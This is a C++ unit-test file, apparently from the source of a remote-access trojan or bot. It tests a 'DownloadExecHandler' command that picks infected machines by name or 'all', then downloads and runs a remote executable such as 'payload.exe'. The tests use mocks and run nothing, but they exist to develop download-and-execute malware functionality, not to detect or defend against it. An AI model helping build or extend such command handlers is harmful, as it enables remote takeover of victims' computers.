#include <gtest/gtest.h>

#include "application/commands/DownloadExecHandler.hpp"
#include "../mocks/MockDownloadExecService.hpp"
#include "../mocks/MockReporter.hpp"

using namespace nuub::application::commands;
using namespace nuub::tests::mocks;

class DownloadExecHandlerTest : public ::testing::Test {
protected:
    MockDownloadExecService dl;
    MockReporter reporter;

    DownloadExecHandler create_handler() {
        return DownloadExecHandler(dl, reporter, "PC-Test");
    }
};

TEST_F(DownloadExecHandlerTest, DownloadsAndExecutes) {
    auto handler = create_handler();
    auto result = handler.handle_downloadexec("PC-Test", "http://example.com/payload.exe");
    EXPECT_TRUE(result.is_success());
    EXPECT_EQ(dl.last_url, "http://example.com/payload.exe");
    EXPECT_FALSE(reporter.messages.empty());
}

TEST_F(DownloadExecHandlerTest, EmptyUrlShowsUsage) {
    auto handler = create_handler();
    auto result = handler.handle_downloadexec("PC-Test", "");
    EXPECT_TRUE(result.is_success());
    EXPECT_TRUE(reporter.messages[0].first.find("Uso") != std::string::npos);
}

TEST_F(DownloadExecHandlerTest, WrongTargetIgnored) {
    auto handler = create_handler();
    handler.handle_downloadexec("Other-PC", "http://example.com/payload.exe");
    EXPECT_TRUE(reporter.messages.empty());
    EXPECT_TRUE(dl.last_url.empty());
}

TEST_F(DownloadExecHandlerTest, AllTargetsMatch) {
    auto handler = create_handler();
    auto result = handler.handle_downloadexec("all", "http://example.com/payload.exe");
    EXPECT_TRUE(result.is_success());
    EXPECT_EQ(dl.last_url, "http://example.com/payload.exe");
}
